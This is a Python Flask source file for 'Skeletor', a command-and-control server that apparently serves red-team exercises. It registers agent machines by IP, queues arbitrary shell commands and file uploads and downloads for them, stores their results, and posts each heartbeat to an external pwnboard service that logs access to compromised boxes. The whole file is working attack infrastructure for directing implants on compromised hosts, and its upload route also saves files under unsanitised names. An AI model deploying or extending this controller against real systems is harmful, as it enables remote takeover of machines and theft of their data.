#!/usr/bin/env python3

from flask import Flask, request, jsonify, abort, send_from_directory,render_template
from flask_sqlalchemy import SQLAlchemy
import requests
from datetime import datetime, timezone
import time
import threading
import os
import logging
from werkzeug.utils import secure_filename

app = Flask(__name__)


#Configuration dictionary
config = {"upload_dir": "uploads", "show_requests": False}

# SQLite database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

#logging config
log = logging.getLogger('werkzeug')
if config['show_requests']:
    log.setLevel(logging.INFO)
else:
    log.setLevel(logging.ERROR)

# Database models
class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), unique=True, nullable=False)
    status = db.Column(db.String(20), default='active')
    targeted = db.Column(db.Boolean,default=False)
    last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
    action = db.Column(db.String(5000), nullable=True,default="NULL")
    command = db.Column(db.String(5000), nullable=True,default="NULL")
    filename = db.Column(db.String(1000), nullable=True,default="NULL")
    destination = db.Column(db.String(1000), nullable=True,default="NULL")
    completed = db.Column(db.Boolean, default=False)
    result = db.Column(db.String(10000), nullable=True,default="NULL")
    returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes

# Initialize database
with app.app_context():
    db.create_all()

#FUNCTIONS:

def setup():
    os.makedirs(config['upload_dir'], exist_ok=True)
    os.makedirs("files", exist_ok=True)


def restrict_remote(func): # Decorator to restrict routes to localhost only
    def wrapper(*args, **kwargs):
        if request.remote_addr not in ['127.0.0.1',"::1"]:
            abort(403)
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__  # To preserve function name for Flask routing
    return wrapper

def update_pwnboard(ip):
    try:
        data = {'ip': ip, 'type': "skeletor"}
        req = requests.post("https://pwnboard.win/pwn/boxaccess", json=data, timeout=3)
    except:
        pass

def update_timestamp(agent_id):
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    agent.last_seen = datetime.now(tz=timezone.utc)
    db.session.commit()

def check_agent_status():
    while True:
        timeout = 300  # 5 minutes
        now = datetime.now(tz=timezone.utc)
        with app.app_context():
            agents = Agent.query.all()
            for agent in agents:
                if agent.last_seen is not None:
                    if agent.last_seen.tzinfo is None:  # If it's naive, assume it's in UTC
                        agent.last_seen = agent.last_seen.replace(tzinfo=timezone.utc)
                if (now - agent.last_seen).total_seconds() > timeout:
                    agent.status = 'inactive'
            db.session.commit()
        time.sleep(180)


#ROUTES:

@app.route('/register', methods=['POST'])
def register_agent():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            new_agent = Agent(agent_id=agent_id)
            db.session.add(new_agent)
            db.session.commit()
            return jsonify({"message": "Agent registered successfully"}), 201
        else:
            agent.status = 'active'
            update_timestamp(agent_id)
            db.session.commit()
            return jsonify({"message": "Agent registration renewed"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/results', methods=['POST'])
def submit_results():
    try:
        # print(request.json)
        print(f"\nIP: {request.json.get('agent_id')}" + "\t" + f"Result: {request.json.get('result')}"+"\n")
        data = request.json
        agent_id = data['agent_id']
        task_id = data['task_id']
        result = data['result']
        task = Task.query.get(task_id)
        task.completed = True
        task.returncode = data['returncode']
        if task.result != "NULL":
            task.result = result
        db.session.commit()
        update_timestamp(agent_id)
        return jsonify({'status': 'success'})
    except:
        pass

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.json
        ip = data['ip']
        print(f"Received heartbeat from {ip}")
        update_pwnboard(ip)
        update_timestamp(ip)
        return jsonify({'status': 'success'})
    except:
        pass

@app.route('/tasks', methods=['POST'])
def get_task():
    ip = request.json.get('agent_id')
    #agent_id = request.args.get('agent_id')
    if ip:
        task = Task.query.filter_by(agent_id=ip, completed=False).first()
        if task:
            task_data = {
                'action': task.action,
                'command': task.command,
                'filename': task.filename,
                'task_id': task.id
            }
            return jsonify(task_data),200
    return jsonify({"status": "No tasks"}), 204

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    safe_filename = secure_filename(filename)  # Prevent directory traversal
    try:
        return send_from_directory("files", safe_filename, as_attachment=True)
    except FileNotFoundError:
        return jsonify({"error": "File not found"}), 404
    
@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({"error": "No file part in the request"}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No file selected for uploading"}), 400    
        file.save(os.path.join(config['upload_dir'], file.filename))
        return jsonify({"message": "File uploaded successfully!", "filename": file.filename}), 200
    except:
        return jsonify({"error": "Invalid data"}), 400



# Localhost only routes for manager
@app.route('/get-agents', methods=['GET'])
@restrict_remote
def get_agents():
    agents = Agent.query.all()
    agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
    return jsonify(agents)

@app.route('/targets', methods=['GET'])
@restrict_remote
def get_targets():
    targets = ""
    agents = Agent.query.filter_by(targeted=True).all()
    for agent in agents:
        targets += agent.agent_id + "\n"
    return targets

@app.route('/set-targets', methods=['POST'])
@restrict_remote
def set_targets():
    data = request.json
    ips = data.get('ips')
    if ips:
        for ip in ips:
            agent = Agent.query.filter_by(agent_id=ip).first()
            if agent:
                agent.targeted = True
                db.session.commit()
        return jsonify({"message": "Targets set successfully"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/untarget', methods=['POST'])
@restrict_remote
def untarget():
    data = request.json
    ips = data.get('ips')
    if ips: 
        for ip in ips:
            agent = Agent.query.filter_by(agent_id=ip).first()
            if agent:
                agent.targeted = False
                db.session.commit()
        return jsonify({"message": "Targets unset successfully"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/clear-targets', methods=['POST'])
@restrict_remote
def clear_targets():
    agents = Agent.query.filter_by(targeted=True).all()
    for agent in agents:
        agent.targeted = False
    db.session.commit()
    return jsonify({"message": "Targets cleared successfully"}), 200

@app.route('/make-task', methods=['POST'])
@restrict_remote
def make_task():
    data = request.json
    agent_id = data.get('agent_id')
    action = data.get('action')
    command = data.get('command')
    if data['action'] == "command":
        command = data.get('command')
    else:
        command = "NULL"
    if data['action'] == "download" or data['action'] == "upload":
        filename = data.get('filename')
    else:
        filename = "NULL"
    try:
        new_task = Task(agent_id=agent_id, action=action, command=command, filename=filename)
        db.session.add(new_task)
        db.session.commit()
        return jsonify({"message": "Task created successfully"}), 201
    except:
        return jsonify({"error": "Invalid data"}), 400

#Main Page
@app.route('/', methods=['GET'])
def homepage():
    webpage_content = """
    <h1>Welcome to Skeletor</h1>
    <h3>Command and Control</h3>
    """
    for agent in Agent.query.all():
        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
    return webpage_content


def main():
    setup()
    agent_checker = threading.Thread(target=check_agent_status,daemon=True)
    agent_checker.start()
    app.run(debug=False,host='0.0.0.0',port=80)


if __name__ == '__main__':
    main()